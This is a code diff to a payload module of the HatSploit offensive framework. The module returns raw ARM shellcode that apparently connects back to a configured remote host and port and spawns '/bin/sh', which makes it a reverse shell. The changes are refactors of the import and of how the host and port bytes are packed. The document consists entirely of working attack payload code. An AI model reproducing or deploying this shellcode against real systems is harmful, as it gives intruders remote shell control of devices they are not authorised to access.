@@ -3,7 +3,7 @@ This payload requires HatSploit: https://hatsploit.com
 Current source: https://github.com/EntySec/HatSploit
 """
 
-from hatsploit.lib.payload import Payload
+from hatsploit.lib.payload.basic import *
 from pex.socket import Socket
 
 
@@ -25,9 +25,6 @@ class HatSploitPayload(Payload, Socket):
         }
 
     def run(self):
-        remote_host = self.pack_host(self.handler['RHOST'])
-        remote_port = self.pack_port(self.handler['RPORT'])
-
         return (
                 b"\x01\x10\x8F\xE2"
                 b"\x11\xFF\x2F\xE1"
@@ -43,6 +40,7 @@ class HatSploitPayload(Payload, Socket):
                 b"\x92\x1a\x05\xb4"
                 b"\x69\x46\x0b\x27"
                 b"\x01\xDF\xC0\x46"
-                b"\x02\x00" + remote_port + remote_host + b"\x2f\x62\x69\x6e"
-                                                          b"\x2f\x73\x68\x00"
+                b"\x02\x00" + self.rport.little + self.rhost.little +
+                b"\x2f\x62\x69\x6e"
+                b"\x2f\x73\x68\x00"
         )
